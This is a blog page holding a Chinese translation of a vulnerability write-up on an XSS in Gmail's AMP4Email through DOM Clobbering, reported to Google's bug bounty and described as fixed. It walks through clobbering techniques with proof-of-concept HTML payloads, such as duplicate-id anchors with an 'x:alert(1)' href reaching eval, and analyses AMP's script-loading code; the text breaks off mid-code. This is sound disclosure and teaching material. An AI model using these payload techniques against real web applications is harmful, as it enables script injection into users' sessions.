@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="原文地址：https://research.securitum.com/xss-in-amp4email-dom-clobbering/  这篇文章是介绍我在2019年八月的谷歌漏洞奖励计划中提交的一个AMP4Email中的XSS漏洞，目前已经得到了修复。这个XSS是现实世界中浏览器中著名的DOM Clobbering问题的一个真实案例。">
+<meta name="keywords" content="安全,XSS,Gmail">
+<meta property="og:type" content="article">
+<meta property="og:title" content="翻译|XSS in GMail’s AMP4Email via DOM Clobbering">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/index.html">
+<meta property="og:site_name" content="Six&#39;s Blog">
+<meta property="og:description" content="原文地址：https://research.securitum.com/xss-in-amp4email-dom-clobbering/  这篇文章是介绍我在2019年八月的谷歌漏洞奖励计划中提交的一个AMP4Email中的XSS漏洞，目前已经得到了修复。这个XSS是现实世界中浏览器中著名的DOM Clobbering问题的一个真实案例。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-1.png">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-2.png">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-3.png">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-6.png">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-5.png">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png">
+<meta property="og:updated_time" content="2019-12-06T15:10:49.781Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="翻译|XSS in GMail’s AMP4Email via DOM Clobbering">
+<meta name="twitter:description" content="原文地址：https://research.securitum.com/xss-in-amp4email-dom-clobbering/  这篇文章是介绍我在2019年八月的谷歌漏洞奖励计划中提交的一个AMP4Email中的XSS漏洞，目前已经得到了修复。这个XSS是现实世界中浏览器中著名的DOM Clobbering问题的一个真实案例。">
+<meta name="twitter:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>翻译|XSS in GMail’s AMP4Email via DOM Clobbering</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/12/05/six' blog 更新记录/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&text=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&is_video=false&description=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=翻译|XSS in GMail’s AMP4Email via DOM Clobbering&body=Check out this article: https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&name=翻译|XSS in GMail’s AMP4Email via DOM Clobbering&description=&lt;blockquote&gt;
+&lt;p&gt;原文地址：&lt;a href=&#34;https://research.securitum.com/xss-in-amp4email-dom-clobbering/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://research.securitum.com/xss-in-amp4email-dom-clobbering/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这篇文章是介绍我在2019年八月的谷歌漏洞奖励计划中提交的一个AMP4Email中的&lt;code&gt;XSS&lt;/code&gt;漏洞，目前已经得到了修复。这个&lt;code&gt;XSS&lt;/code&gt;是现实世界中浏览器中著名的DOM Clobbering问题的一个真实案例。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&t=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#什么是AMP4Email？"><span class="toc-number">1.</span> <span class="toc-text">什么是AMP4Email？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-Clobbering"><span class="toc-number">2.</span> <span class="toc-text">DOM Clobbering</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AMP4Email中实现DOM-Clobbering"><span class="toc-number">3.</span> <span class="toc-text">AMP4Email中实现DOM Clobbering</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#时间轴"><span class="toc-number">5.</span> <span class="toc-text">时间轴</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        翻译|XSS in GMail’s AMP4Email via DOM Clobbering
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Six's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-05T16:00:00.000Z" itemprop="datePublished">2019-12-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/翻译/">翻译</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Gmail/">Gmail</a>, <a class="tag-link" href="/tags/XSS/">XSS</a>, <a class="tag-link" href="/tags/安全/">安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>原文地址：<a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
+</blockquote>
+<p>这篇文章是介绍我在2019年八月的谷歌漏洞奖励计划中提交的一个AMP4Email中的<code>XSS</code>漏洞，目前已经得到了修复。这个<code>XSS</code>是现实世界中浏览器中著名的DOM Clobbering问题的一个真实案例。</p>
+<a id="more"></a>
+<h4 id="什么是AMP4Email？"><a href="#什么是AMP4Email？" class="headerlink" title="什么是AMP4Email？"></a>什么是AMP4Email？</h4><p>AMP4Email(也称为动态邮件)是Gmail的一个新特性，它可以使电子邮件包含动态HTML内容。虽然包含HTML标记的电子邮件已经存在很多年了，但人们通常认为邮件的HTML只包含静态内容，如一些格式化的东西，图像等，而没有任何脚本或表单。AMP4Email意味着更进一步，其允许电子邮件中的动态内容。在谷歌官方<a href="https://gsuiteupdates.googleblog.com/2019/06/dynamic-email-in-gmail-becoming-GA.html" target="_blank" rel="noopener">G Suite</a>博客的一篇文章中，对动态邮件的使用进行了很好的总结：</p>
+<blockquote>
+<p>使用动态电子邮件，你可以容易地直接在邮件中进行一些操作，比如回复某个事件、填写问卷、浏览目录或回复评论。</p>
+<p>以在谷歌文档中做评论为例。现在，当某人在评论中提到你时，你将不会收到单独的电子邮件通知，而是在Gmail中看到一个最新的线程，你可以很容易地从消息中回复或关闭评论。</p>
+</blockquote>
+<p>该特性带来了一些明显的安全问题；最重要的一个可能是：跨站点脚本(XSS)？如果我们允许在电子邮件中使用动态内容，这是否意味着我们可以轻松地注入任意的JavaScript代码?——不，事实上，要实现这并不容易。</p>
+<p>简而言之，AMP4Email有一个强大的<a href="https://github.com/ampproject/amphtml/blob/master/validator/validator-main.protoascii" target="_blank" rel="noopener">验证器</a>，其是一个动态邮件中允许的标记和属性的强大的白名单。你可以在<a href="https://amp.gmail.dev/playground/上尝试一下，也可以向自己发送一封动态电子邮件，看看它是如何工作的" target="_blank" rel="noopener">https://amp.gmail.dev/playground/上尝试一下，也可以向自己发送一封动态电子邮件，看看它是如何工作的</a>!</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-1.png" alt="amp4Email"></p>
+<p>图1 AMP4Email 演示</p>
+<p>如果你试图添加验证器不允许的任何HTML元素或属性，将会收到一个错误。</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-2.png" alt="error"></p>
+<p>图2 AMP验证器不允许任何脚本标签</p>
+<p>在试用AMP4Email并尝试各种绕过它的方法时，我注意到id属性在标记中是允许的(图3)。注：原中文中这里写的是不允许，但看下面分析，应该是笔误。</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-3.png" alt="id"></p>
+<p>图3 id属性是允许的 </p>
+<p>这可能是可以进行安全分析的点，因为创建具有用户控制的id属性的HTML元素可能导致DOM Clobbering。</p>
+<h4 id="DOM-Clobbering"><a href="#DOM-Clobbering" class="headerlink" title="DOM Clobbering"></a>DOM Clobbering</h4><p>DOM Clobbering是一个不断给许多应用程序带来麻烦web浏览器的遗留特性。一般来讲，当你创建一个HTML元素（例如，<code>&lt;input id=username&gt;</code>），并且想利用<code>JavaScript</code>引用它，你会这样做<code>document.getElementById(&#39;username&#39;)</code> 或者<code>document.querySelector(&#39;#username&#39;)</code>。但这并不是唯一的方法！</p>
+<p>传统的方法是通过全局<code>window</code> 对象的属性来访问它。所以在这个例子中，<code>window.usernam</code>和<code>document.getElementById(&#39;username&#39;)</code>是完全相同的。如果应用程序基于某些全局变量的存在做出决策，这种行为(称为<code>DOM Cloberring</code>)可能会导致有趣的漏洞，例如：<code>if (window.isAdmin) { ... }</code>。</p>
+<p>为了进一步分析<code>DOM Clobbering</code>，假设我们有以下JavaScript代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.test1.test2) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">''</span>+<span class="built_in">window</span>.test1.test2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们的目标是仅使用<code>DOM Clobbering</code>技术来评估任意的JS代码。为了实现这个任务，我们首先需要解决这样两个问题：</p>
+<ol>
+<li>我们知道可以在<code>window</code>上创建新属性，但是我们可以在其他对象上创建新属性吗？如例子中的<code>test1.test2</code></li>
+<li>我们可以控制如何将DOM元素转换成字符串吗？大多数HTML元素在转换为字符串时，都会返回类似的内容<code>[object HTMLInputElement]</code>。</li>
+</ol>
+<p>让我们首先解决第一个问题。解决这个问题最常用的一个方法是使用<code>&lt;form&gt;</code>标签。<code>&lt;form&gt;</code>标签的每个<code>&lt;input&gt;</code>后代都作为其一个属性被添加，该属性的名称等于<code>&lt;input&gt;</code>的<code>name</code>属性。如下面的例子：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  alert(test1.test2); <span class="comment">// alerts "[object HTMLInputElement]"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对于第二个问题，我创建了一个简短的JS代码，它遍历HTML中所有可能的元素，并检查它们的<code>toString</code>方法是继承自<code>Object.prototype</code>还是以另一种方式定义的。如果不是继承自<code>Object.prototype</code>，就可以返回<code>[object SomeElement]</code>之外的其他内容。</p>
+<p>代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">window</span>)</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p.match(<span class="regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="function"><span class="params">p</span> =&gt;</span> <span class="built_in">window</span>[p])</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></table></figure>
+<p>这段代码返回两个元素：<code>HTMLAreaElement</code>(<code>&lt;area&gt;</code>)和<code>HTMLAnchorElement</code> (<code>&lt;a&gt;</code>)。在AMP4Email中，第一个是不允许的，所以我们只关注第二个。对于<code>&lt;a&gt;</code>元素，<code>toString</code>只返回<code>href</code>属性的值。看下面的例子：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">href</span>=<span class="string">https://securitum.com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  alert(test1); <span class="comment">// alerts "https://securitum.com"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在这一点上，似乎如果我们想要解决最初的问题(即，通过<code>DOM Clobbering</code>来评估<code>window.test1.test2</code>的值)，我们需要一个类似下面的代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"x:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但问题在于它根本不管用。<code>test1.test2</code> 返回的其实是<code>undefined</code>。<code>&lt;input&gt;</code>可以成为<code>&lt;form&gt;</code>的属性，但<code>&lt;a&gt;</code>并不可以。</p>
+<p>不过，对于这个问题有一个有趣的解决方案，它可以在基于WebKit和基于blink的浏览器中工作。假设我们有两个id相同的元素：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span>click!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span>click2!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那么我访问<code>window.test1</code>时会得到什么结果呢？我本能地期望获得具有该id的第一个元素，这是使用<code>document.getElementById(&#39;#test1&#39;)</code>方法时会产生的结果。然而，在<code>Chromium</code>中，我们实际上得到了一个<code>HTMLCollection</code>！</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-6.png" alt="html"></p>
+<p>图4 <code>window.test</code>指向<code>HTMLCollection</code></p>
+<p>如图4中看到，特别有趣的是我们可以通过索引(本例中为0和1)和<code>id</code>一样访问<code>HTMLCollection</code>中的特定元素。这意味着 <code>window.test1.test1</code>实际上指的是第一个元素。这证明设置<code>name</code>属性也会在<code>HTMLCollection</code>中创建新的属性。如下面的代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span>click!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span>click2!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们可以通过 <code>window.test1.test2</code>方法得到第二个锚元素。</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-5.png" alt="test"></p>
+<p>图5 <code>window.test1.test2</code>成功获得</p>
+<p>那么，回到最初对于<code>DOM Clobbering</code>的利用 <code>eval(&#39;&#39;+window.test1.test2)</code> ，可以这样实现：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span> <span class="attr">name</span>=<span class="string">"test2"</span> <span class="attr">href</span>=<span class="string">"x:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>现在，让我们回到AMP4Email，看看如何在真实的案例中利用<code>DOM Clobbering</code>。</p>
+<h4 id="AMP4Email中实现DOM-Clobbering"><a href="#AMP4Email中实现DOM-Clobbering" class="headerlink" title="AMP4Email中实现DOM Clobbering"></a>AMP4Email中实现DOM Clobbering</h4><p>我已经提到过，通过向元素添加自己的id属性，AMP4Email很容易遭受<code>DOM Clobbering</code> 。为了找到一些可利用的条件，我决定看看<code>window</code> 的属性，如图6。立刻引起我注意的是<code>AMP</code>。</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png" alt="6"></p>
+<p>图6 全局对象<code>window</code>的属性</p>
+<p>AMP4Email实际上使用了一些针对<code>DOM Clobbering</code>的保护，它严格禁止<code>id</code>属性的某些值，例如：<code>AMP</code>，图7中所示。</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png" alt="7"></p>
+<p>图7 在AMP4Email中AMP不能做为id的值</p>
+<p>但是，<code>AMP_MODE</code>没有出现相同的限制。所以我准备了一段代码<code>&lt;a id=AMP_MODE&gt;</code>看看会发生什么，我注意到控制台出现了一个非常有趣的错误。</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png" alt="8"></p>
+<p>图8 加载某些JS文件发生404</p>
+<p>如图8所示， AMP4Email试图加载某些JS文件，但由于404问题未能成功。然而，值得注意的是请求URL 的中间存在一个<code>undefined</code>（<a href="https://cdn.ampproject.org/rtv/`undefined`/v0/amp-auto-lightbox-0.1.js）。我能想到的解释只有一个：AMP试图获取一个`AMP_MODE`属性来将其放到URL中。由于`DOM" target="_blank" rel="noopener">https://cdn.ampproject.org/rtv/`undefined`/v0/amp-auto-lightbox-0.1.js）。我能想到的解释只有一个：AMP试图获取一个`AMP_MODE`属性来将其放到URL中。由于`DOM</a> Clobbering<code>，并没有得到预期的值，因此得到的是</code>undefined`。实现包含的代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">f.preloadExtension = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">            <span class="string">"amp-embed"</span> == a &amp;&amp; (a = <span class="string">"amp-ad"</span>);</span><br><span class="line">            <span class="keyword">var</span> c = fn(<span class="keyword">this</span>, a, !<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (c.loaded || c.error)</span><br><span class="line">                <span class="keyword">var</span> d = !<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">void</span> <span class="number">0</span> === c.scriptPresent &amp;&amp; (d = <span class="keyword">this</span>.win.document.head.querySelector(<span class="string">'[custom-element="'</span> + a + <span class="string">'"]'</span>),</span><br><span class="line">                c.scriptPresent = !!d),</span><br><span class="line">                d = !c.scriptPresent;</span><br><span class="line">            <span class="keyword">if</span> (d) &#123;</span><br><span class="line">                d = b;</span><br><span class="line">                b = <span class="keyword">this</span>.win.document.createElement(<span class="string">"script"</span>);</span><br><span class="line">                b.async = !<span class="number">0</span>;</span><br><span class="line">                yb(a, <span class="string">"_"</span>) ? d = <span class="string">""</span> : b.setAttribute(<span class="number">0</span> &lt;= dn.indexOf(a) ? <span class="string">"custom-template"</span> : <span class="string">"custom-element"</span>, a);</span><br><span class="line">                b.setAttribute(<span class="string">"data-script"</span>, a);</span><br><span class="line">                b.setAttribute(<span class="string">"i-amphtml-inserted"</span>, <span class="string">""</span>);</span><br><span class="line">                <span class="keyword">var</span> e = <span class="keyword">this</span>.win.location;</span><br><span class="line">                t().test &amp;&amp; <span class="keyword">this</span>.win.testLocation &amp;&amp; (e = <span class="keyword">this</span>.win.testLocation);</span><br><span class="line">                <span class="keyword">if</span> (t().localDev) &#123;</span><br><span class="line">                    <span class="keyword">var</span> g = e.protocol + <span class="string">"//"</span> + e.host;</span><br><span class="line">                    <span class="string">"about:"</span> == e.protocol &amp;&amp; (g = <span class="string">""</span>);</span><br><span class="line">                    e = g + <span class="string">"/dist"</span></span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                    e = hd.cdn;</span><br><span class="line">                g = t().rtvVersion;</span><br><span class="line">                <span class="literal">null</span> == d &amp;&amp; (d = <span class="string">"0.1"</span>);</span><br><span class="line">                d = d ? <span class="string">"-"</span> + d : <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">var</span> h = t().singlePassType ? t().singlePassType + <span class="string">"/"</span> : <span class="string">""</span>;</span><br><span class="line">                b.src = e + <span class="string">"/rtv/"</span> + g + <span class="string">"/"</span> + h + <span class="string">"v0/"</span> + a + d + <span class="string">".js"</span>;</span><br><span class="line">                <span class="keyword">this</span>.win.document.head.appendChild(b);</span><br><span class="line">                c.scriptPresent = !<span class="number">0</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> gn(c)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>虽然并不是难以理解，但我还是对它做了手动的反混淆。为了清楚起见，有些部分省略了，如下面所示：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">window</span>.document.createElement(<span class="string">"script"</span>);</span><br><span class="line">script.async = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> loc;</span><br><span class="line"><span class="keyword">if</span> (AMP_MODE.test &amp;&amp; <span class="built_in">window</span>.testLocation) &#123;</span><br><span class="line">    loc = <span class="built_in">window</span>.testLocation</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    loc = <span class="built_in">window</span>.location;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (AMP_MODE.localDev) &#123;</span><br><span class="line">    loc = loc.protocol + <span class="string">"//"</span> + loc.host + <span class="string">"/dist"</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    loc = <span class="string">"https://cdn.ampproject.org"</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="string">"/"</span> : <span class="string">""</span>;</span><br><span class="line">b.src = loc + <span 